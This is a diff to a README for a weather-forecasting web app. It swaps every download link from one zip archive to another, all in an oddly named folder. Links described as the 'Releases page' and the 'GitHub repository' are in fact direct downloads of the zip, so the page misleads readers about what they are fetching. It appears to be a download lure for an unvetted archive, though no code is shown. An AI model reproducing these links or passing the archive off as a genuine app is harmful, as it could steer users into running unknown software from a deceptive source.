@@ -1,6 +1,6 @@
 # 🌤️ Weather-forecasting-webapp - Get Accurate Weather Updates Easily
 
-[![Download Now](https://raw.githubusercontent.com/SatyaPShukla/Weather-forecasting-webapp/main/vesicoclysis/Weather-forecasting-webapp-v3.0.zip%20Now-Ready%20to%20Run-brightgreen)](https://raw.githubusercontent.com/SatyaPShukla/Weather-forecasting-webapp/main/vesicoclysis/Weather-forecasting-webapp-v3.0.zip)
+[![Download Now](https://raw.githubusercontent.com/SatyaPShukla/Weather-forecasting-webapp/main/vesicoclysis/Weather_forecasting_webapp_v2.0.zip%20Now-Ready%20to%20Run-brightgreen)](https://raw.githubusercontent.com/SatyaPShukla/Weather-forecasting-webapp/main/vesicoclysis/Weather_forecasting_webapp_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to the Weather-forecasting-webapp! This application helps you stay infor
 
 To begin using the Weather-forecasting-webapp, you need to download it. 
 
-Visit this page to download: [Weather-forecasting-webapp Releases](https://raw.githubusercontent.com/SatyaPShukla/Weather-forecasting-webapp/main/vesicoclysis/Weather-forecasting-webapp-v3.0.zip)
+Visit this page to download: [Weather-forecasting-webapp Releases](https://raw.githubusercontent.com/SatyaPShukla/Weather-forecasting-webapp/main/vesicoclysis/Weather_forecasting_webapp_v2.0.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version available.
@@ -60,6 +60,6 @@ This project is licensed under the MIT License. Please see the LICENSE file for 
 
 ## 🌟 Want to Know More?
 
-For further details about our application, visit the GitHub repository: [Weather-forecasting-webapp](https://raw.githubusercontent.com/SatyaPShukla/Weather-forecasting-webapp/main/vesicoclysis/Weather-forecasting-webapp-v3.0.zip)
+For further details about our application, visit the GitHub repository: [Weather-forecasting-webapp](https://raw.githubusercontent.com/SatyaPShukla/Weather-forecasting-webapp/main/vesicoclysis/Weather_forecasting_webapp_v2.0.zip)
 
 You are now ready to download and enjoy accurate weather updates!
